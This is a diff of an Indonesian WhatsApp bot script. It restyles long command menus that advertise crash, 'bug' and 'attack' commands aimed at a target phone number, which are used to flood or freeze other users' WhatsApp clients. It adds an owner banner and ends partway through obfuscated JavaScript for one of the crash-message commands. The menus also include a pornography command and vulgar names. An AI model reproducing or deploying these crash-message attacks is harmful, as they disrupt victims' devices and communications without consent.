-│➣ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
-│➣ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
-│➣ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
-│➣ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚚𝚛𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4236,17 +4239,17 @@ break
 │  ◪〘 VOICE MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚋𝚊𝚜𝚜
-│➣ ${prefix}𝚋𝚕𝚘𝚠𝚗
-│➣ ${prefix}𝚍𝚎𝚎𝚙
-│➣ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
-│➣ ${prefix}𝚏𝚊𝚜𝚝
-│➣ ${prefix}𝚏𝚊𝚝
-│➣ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
-│➣ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
-│➣ ${prefix}𝚛𝚘𝚋𝚘𝚝
-│➣ ${prefix}𝚜𝚕𝚘𝚠
-│➣ ${prefix}𝚝𝚞𝚙𝚊𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚊𝚜𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚎𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚜𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚕𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4264,17 +4267,17 @@ break
 │ ◪〘 OWNER MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
-│➣ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
-│➣ ${prefix}𝚕𝚎𝚊𝚟𝚎
-│➣ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
-│➣ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
-│➣ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4297,171 +4300,181 @@ jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky1.mp3'), mimetype: 
 ▇▇▇◣╲▇╱◢▇▇▇ 
 ╭─────────────────╮
 │     ⸸‎〘 BUG IKY 〙⸸‎
+│[🇮🇩] 𝐈𝐍𝐈 𝐀𝐃𝐀𝐋𝐀𝐇 𝐁𝐎𝐓 𝐏𝐑𝐈𝐁𝐀𝐃𝐈 𝐈𝐊𝐘𝐘 𝐌𝐀𝐊𝐄𝐑𝐙⚡
+│  OWNER  : ${ownername}
+│𝐉𝐀𝐍𝐆𝐀𝐍 𝐋𝐔𝐏𝐀 𝐔𝐍𝐓𝐔𝐊 𝐁𝐀𝐇𝐀𝐆𝐈𝐀 [🇮🇩]
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}poll
-│➣ ${prefix}polliky
-│➣ ${prefix}polvot
-│➣ ${prefix}bokep
-│➣ ${prefix}ikysantet
-│➣ ${prefix}ikydocnopayment
-│➣ ${prefix}ikyinfinite
-│➣ ${prefix}ikycrashchat
-│➣ ${prefix}ikymakerzcrash
-│➣ ${prefix}ikycrashnopayment
-│➣ ${prefix}ikycrashpakepayment
-│➣ ${prefix}ikynomercy
-│➣ ${prefix}ikycrashemoji
-│➣ ${prefix}ikycrashtitik
-│➣ ${prefix}ikythemonster
-│➣ ${prefix}ikybug1 (jumlah)
-│➣ ${prefix}ikybug2 (jumlah) 
-│➣ ${prefix}ikybug3 (jumlah)
-│➣ ${prefix}ikybug4 (jumlah) 
-│➣ ${prefix}ikybug5 (jumlah) 
-│➣ ${prefix}ikybug6 (jumlah)
-│➣ ${prefix}ikybug7 (jumlah)
-│➣ ${prefix}ikybug8 (jumlah)
-│➣ ${prefix}ikybug9 (jumlah)
-│➣ ${prefix}ikybug10 (jumlah)
-│➣ ${prefix}ikybug11 (jumlah)
-│➣ ${prefix}ikybug12 (jumlah)
-│➣ ${prefix}ikyness (jumlah) 
-│➣ ${prefix}ikydarkness (jumlah) 
-│➣ ${prefix}ngentids (jumlah) 
-│➣ ${prefix}ikymakerztravazap (jumlah) 
-│➣ ${prefix}ikymakerzcrashhuhu (jumlah) 
-│➣ ${prefix}ikygans (jumlah) 
-│➣ ${prefix}kintil (jumlah)
-│➣ ${prefix}peler (jumlah)
-│➣ ${prefix}itzmeiky (jumlah) 
-│➣ ${prefix}pelerpakepayment (jumlah) 
-│➣ ${prefix}ikypay (jumlah)
-│➣ ${prefix}ikytroli (jumlah)
-│➣ ${prefix}kontol (jumlah)
-│➣ ${prefix}kuntul (jumlah)
-│➣ ${prefix}ikydocu (jumlah)
-│➣ ${prefix}ikyhello (jumlah)
-│➣ ${prefix}virkon (jumlah) 
-│➣ ${prefix}ikylokas (jumlah)
-│➣ ${prefix}monyet (jumlah)
-│➣ ${prefix}ikymomo (jumlah) 
-│➣ ${prefix}ikybuggam (jumlah) 
-│➣ ${prefix}ikybugpc (jumlah)
-│➣ ${prefix}ikybugvn (jumlah)
-│➣ ${prefix}ikytroliv2 (jumlah)
-│➣ ${prefix}ikyliveloc (jumlah)
-│➣ ${prefix}ikybuglist (jumlah)
-│➣ ${prefix}ikytagcrash (jumlah)
-│➣ ${prefix}ikycatalog (jumlah)
-│➣ ${prefix}ikybugstik (jumlah)
-│➣ ${prefix}crashiky (jumlah)
-│➣ ${prefix}ikybutton (jumlah)
-│➣ ${prefix}ikybugloc (jumlah)
-│➣ ${prefix}ikybugdoc (jumlah)
-│➣ ${prefix}ikylivelocv2 (jumlah)
-│➣ ${prefix}ikybuginvite (jumlah)
-│➣ ${prefix}ikybugstikv2 (jumlah)
-│➣ ${prefix}ikycatalogv2 (jumlah)
-│➣ ${prefix}ikybugbutton (jumlah)
-│➣ ${prefix}ikybuttonygy (jumlah)
-│➣ ${prefix}ikytengkorak (jumlah)
-│➣ ${prefix}ikyandroid (jumlah) 
-│➣ ${prefix}ikymakerzcrashv2 (jumlah) 
-│➣ ${prefix}ikyartcrash (jumlah) 
-│➣ ${prefix}tengkorak [unlimited]
+││᭄⃟ꪶ⃟•╾ ${prefix}poll
+││᭄⃟ꪶ⃟•╾ ${prefix}polliky
+││᭄⃟ꪶ⃟•╾ ${prefix}polvot
+││᭄⃟ꪶ⃟•╾ ${prefix}bokep
+││᭄⃟ꪶ⃟•╾ ${prefix}ikysantet
+││᭄⃟ꪶ⃟•╾ ${prefix}ikydocnopayment
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyinfinite
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashchat
+││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerzcrash
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashnopayment
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashpakepayment
+││᭄⃟ꪶ⃟•╾ ${prefix}ikynomercy
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyselebew
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashemoji
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashtitik
+││᭄⃟ꪶ⃟•╾ ${prefix}ikythemonster
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug1 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug2 (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug3 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug4 (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug5 (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug6 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug7 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug8 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug9 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug10 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug11 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybug12 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyness (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikydarkness (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ngentids (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerztravazap (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerzcrashhuhu (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygans (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}kintil (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}peler (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}itzmeiky (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}pelerpakepayment (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikypay (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikytroli (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}kontol (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}kuntul (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikydocu (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyhello (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}virkon (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikylokas (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}monyet (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikymomo (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuggam (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugpc (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugvn (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikytroliv2 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyliveloc (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuglist (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikytagcrash (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycatalog (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugstik (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}crashiky (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybutton (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugloc (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugdoc (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikylivelocv2 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuginvite (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugstikv2 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikycatalogv2 (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugbutton (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuttonygy (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikytengkorak (jumlah)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyandroid (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerzcrashv2 (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyartcrash (jumlah) 
+││᭄⃟ꪶ⃟•╾ ${prefix}tengkorak [unlimited]
 ╰─────────────────╮
 ╭─────────────────╯
 │ ◪〘 MENU ATTACK1 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}ikyvnprivate (Nomer) 
-│➣ ${prefix}ikykintilprivate (Nomer)
-│➣ ${prefix}ikybuttoprivate (Nomer) 
-│➣ ${prefix}ikystikprivate (Nomer) 
-│➣ ${prefix}ikytroliprivate (Nomer)
-│➣ ${prefix}ikykontolprivate (Nomer)
-│➣ ${prefix}ikykuntulprivate (Nomer)
-│➣ ${prefix}ikyhelloprivate (Nomer)
-│➣ ${prefix}ikysantetprivate (Nomer) 
-│➣ ${prefix}ikymomoprivate (Nomer) 
-│➣ ${prefix}ikybuglocprivate (Nomer)
-│➣ ${prefix}ikyinfiniteprivate (Nomer) 
-│➣ ${prefix}ikybuttonprivate (Nomer)
-│➣ ${prefix}ikylivelocprivate (Nomer)
-│➣ ${prefix}ikybugdocprivate (Nomer)
-│➣ ${prefix}ikybuginviteprivate (Nomer)
-│➣ ${prefix}ikytengkorakprivate (Nomer)
-│➣ ${prefix}ikyprivatebug1 (Nomer) 
-│➣ ${prefix}ikyprivatebug2 (Nomer) 
-│➣ ${prefix}ikyprivatebug3 (Nomer) 
-│➣ ${prefix}ikyprivatebug4 (Nomer) 
-│➣ ${prefix}ikyprivatebug5 (Nomer) 
-│➣ ${prefix}ikyprivatebug6 (Nomer) 
-│➣ ${prefix}ikyprivatebug7 (Nomer) 
-│➣ ${prefix}ikyprivatebug8 (Nomer) 
-│➣ ${prefix}ikyprivatebug9 (Nomer) 
-│➣ ${prefix}ikyprivatebug10 (Nomer) 
-│➣ ${prefix}ikyprivatebug11 (Nomer) 
-│➣ ${prefix}ikyprivatebug12 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyvnprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikythebadboyprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikykintilprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuttoprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikystikprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikytroliprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikykontolprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikykuntulprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyhelloprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikysantetprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikymomoprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuglocprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyinfiniteprivate (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuttonprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikylivelocprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybugdocprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikybuginviteprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikytengkorakprivate (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug1 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug2 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug3 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug4 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug5 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug6 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug7 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug8 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug9 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug10 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug11 (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug12 (Nomer) 
 ╰─────────────────╮
 ╭─────────────────╯
 │ ◪〘 MENU ATTACK2 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}ikygaskenvn (Nomer) 
-│➣ ${prefix}ikygaskenstik (Nomer) 
-│➣ ${prefix}ikygaskentroli (Nomer)
-│➣ ${prefix}ikygaskenkintil (Nomer)
-│➣ ${prefix}ikygaskenhello (Nomer) 
-│➣ ${prefix}ikygaskenkontol (Nomer)
-│➣ ${prefix}ikygaskenkuntul (Nomer)
-│➣ ${prefix}ikygaskenmomo (Nomer) 
-│➣ ${prefix}ikygaskensantet (Nomer) 
-│➣ ${prefix}ikygaskeninfinite (Nomer) 
-│➣ ${prefix}ikygaskenliveloc (Nomer)
-│➣ ${prefix}ikygaskenbutton (Nomer)
-│➣ ${prefix}ikygaskenbugloc (Nomer)
-│➣ ${prefix}ikygaskentengkorak (Nomer) 
-│➣ ${prefix}ikygaskenbug1 (Nomer)
-│➣ ${prefix}ikygaskenbug2 (Nomer)
-│➣ ${prefix}ikygaskenbug3 (Nomer)
-│➣ ${prefix}ikygaskenbug4 (Nomer)
-│➣ ${prefix}ikygaskenbug5 (Nomer)
-│➣ ${prefix}ikygaskenbug6 (Nomer)
-│➣ ${prefix}ikygaskenbug7 (Nomer)
-│➣ ${prefix}ikygaskenbug8 (Nomer)
-│➣ ${prefix}ikygaskenbug9 (Nomer)
-│➣ ${prefix}ikygaskenbug10 (Nomer)
-│➣ ${prefix}ikygaskenbug11 (Nomer)
-│➣ ${prefix}ikygaskenbug12 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenvn (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenstik (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskentroli (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenkintil (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenhello (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenkontol (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenkuntul (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenmomo (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskensantet (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskeninfinite (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenliveloc (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbutton (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbugloc (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskentengkorak (Nomer) 
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug1 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug2 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug3 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug4 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug5 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug6 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug7 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug8 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug9 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug10 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug11 (Nomer)
+││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug12 (Nomer)
 ╰─────────────────╯
 ╰─────────────────╮
 ╭─────────────────╯
 │ ◪〘 JADI BUG MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}polling (teks)
-│➣ ${prefix}jadilokas (teks/reply)
-│➣ ${prefix}jadibugdoc (send/replyMedia)
-│➣ ${prefix}jadibugbutton (teks)
-│➣ ${prefix}jaditroli (teks) 
-│➣ ${prefix}jadipeler (teks) 
-│➣ ${prefix}jadimonyet (teks) 
-│➣ ${prefix}kybugstik (reply image)
-│➣ ${prefix}jadibugvn (reply audio) 
-│➣ ${prefix}jadivirkon (teks/reply teks)
-│➣ ${prefix}jadiikyness (reply media) 
-│➣ ${prefix}jadingentids (reply media) 
-│➣ ${prefix}jadidarkness (reply media)
-│➣ ${prefix}jadikintil (teks/reply teks) 
-│➣ ${prefix}jadikuntul (teks/reply teks) 
-│➣ ${prefix}jadikontol (teks/reply teks) 
-│➣ ${prefix}jadibugloc (teks/reply teks) 
-│➣ ${prefix}jadiliveloc (teks/reply teks) 
-│➣ ${prefix}jadicatalog (reply media + teks) 
-│➣ ${prefix}jadibuttonimg (reply media + teks)
+││᭄⃟ꪶ⃟•╾ ${prefix}polling (teks)
+││᭄⃟ꪶ⃟•╾ ${prefix}jadilokas (teks/reply)
+││᭄⃟ꪶ⃟•╾ ${prefix}jadibugdoc (send/replyMedia)
+││᭄⃟ꪶ⃟•╾ ${prefix}jadibugbutton (teks)
+││᭄⃟ꪶ⃟•╾ ${prefix}jaditroli (teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadipeler (teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadimonyet (teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}kybugstik (reply image)
+││᭄⃟ꪶ⃟•╾ ${prefix}jadibugvn (reply audio) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadivirkon (teks/reply teks)
+││᭄⃟ꪶ⃟•╾ ${prefix}jadiikyness (reply media) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadingentids (reply media) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadidarkness (reply media)
+││᭄⃟ꪶ⃟•╾ ${prefix}jadikintil (teks/reply teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadikuntul (teks/reply teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadikontol (teks/reply teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadibugloc (teks/reply teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadiliveloc (teks/reply teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadicatalog (reply media + teks) 
+││᭄⃟ꪶ⃟•╾ ${prefix}jadibuttonimg (reply media + teks)
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
+𝐆𝐔𝐍𝐀𝐊𝐀𝐍𝐋𝐀𝐇 𝐃𝐄𝐍𝐆𝐀𝐍 𝐁𝐈𝐉𝐀𝐊!! 
+𝐉𝐈𝐊𝐀 𝐀𝐃𝐀 𝐊𝐄𝐒𝐀𝐇𝐀𝐋𝐀𝐍 𝐏𝐀𝐃𝐀 𝐁𝐎𝐓 𝐂𝐇𝐀𝐓 wa.me/6289516394161
+[🇮🇩]𝐉𝐀𝐍𝐆𝐀𝐍𝐋𝐀𝐇 𝐊𝐀𝐔 𝐓𝐀𝐊𝐔𝐓 𝐔𝐍𝐓𝐔𝐊 𝐌𝐄𝐍𝐂𝐎𝐁𝐀
+[🇮🇩]𝐊𝐄𝐆𝐀𝐆𝐀𝐋𝐀𝐍 𝐃𝐈𝐒𝐄𝐁𝐀𝐁𝐊𝐀𝐍 𝐊𝐀𝐑𝐄𝐍𝐀 𝐊𝐀𝐔 𝐓𝐈𝐃𝐀𝐊 𝐁𝐄𝐍𝐀𝐑-𝐁𝐄𝐍𝐀𝐑 𝐌𝐄𝐍𝐆𝐈𝐍𝐆𝐈𝐍𝐊𝐀𝐍𝐍𝐘𝐀
+${ownername} [🇮🇩]
 
 © ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
 `
@@ -4970,7 +4983,7 @@ function _0x5937(){const _0x1cc65e=['@s.whatsapp.net','bind','reply','apply','in
 }
 break
 case 'jadibuttonimg':{
-const _0x2dcaf5=_0x26fb;(function(_0x50373a,_0x539b2e){const _0x26c522=_0x26fb,_0xe82273=_0x50373a();while(!![]){try{const _0x3bb09e=parseInt(_0x26c522(0x111))/0x1+-parseInt(_0x26c522(0x10c))/0x2+-parseInt(_0x26c522(0x10a))/0x3*(-parseInt(_0x26c522(0x103))/0x4)+-parseInt(_0x26c522(0x11d))/0x5+-parseInt(_0x26c522(0x10b))/0x6*(parseInt(_0x26c522(0x10e))/0x7)+parseInt(_0x26c522(0x113))/0x8*(parseInt(_0x26c522(0x110))/0x9)+parseInt(_0x26c522(0x100))/0xa*(parseInt(_0x26c522(0x106))/0xb);if(_0x3bb09e===_0x539b2e)break;else _0xe82273['push'](_0xe82273['shift']());}catch(_0x51817c){_0xe82273['push'](_0xe82273['shift']());}}}(_0x2352,0x1c152));const _0x3604fb=(function(){let _0x2a0c32=!![];return function(_0x35d147,_0x1ec35d){const _0x4c75a6=_0x2a0c32?function(){if(_0x1ec35d){const _0x4a0dca=_0x1ec35d['apply'](_0x35d147,arguments);return _0x1ec35d=null,_0x4a0dca;}}:function(){};return _0x2a0c32=![],_0x4c75a6;};}()),_0x20d650=_0x3604fb(this,function(){const _0x403829=_0x26fb;return _0x20d650[_0x403829(0x114)]()[_0x403829(0x116)](_0x403829(0x115))['toString']()[_0x403829(0xfa)](_0x20d650)[_0x403829(0x116)]('(((.+)+)+)+$');});_0x20d650();const _0x28362b=(function(){let _0x5c6fe8=!![];return function(_0x5bff11,_0x40ff55){const _0x3fe4b1=_0x5c6fe8?function(){const _0x554e04=_0x26fb;if(_0x40ff55){const _0x2d6f9e=_0x40ff55[_0x554e04(0xfd)](_0x5bff11,arguments);return _0x40ff55=null,_0x2d6f9e;}}:function(){};return _0x5c6fe8=![],_0x3fe4b1;};}()),_0x3c6f79=_0x28362b(this,function(){const _0x456bf6=_0x26fb,_0x5df853=function(){const _0x30ae3d=_0x26fb;let 